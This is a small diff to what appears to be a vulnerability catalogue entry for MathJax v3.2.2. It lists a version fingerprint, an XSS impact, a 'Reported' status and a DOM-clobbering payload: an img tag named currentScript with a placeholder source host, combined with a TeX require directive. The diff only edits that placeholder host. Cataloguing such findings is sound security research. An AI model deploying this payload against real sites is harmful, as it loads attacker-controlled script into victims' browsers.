@@ -6,7 +6,7 @@
 + Stars: 10.1K
 + Version: v3.2.2
 + Fingerprint: `MathJax.version == "3.2.2"`
-+ Payload: ```<img name="currentScript" src="https://xxx.xxxx.xxx"></img> $$\require{tex}$$```
++ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"></img> $$\require{tex}$$```
 + Impact: XSS
 + CVE: N/A
 + Status: Reported
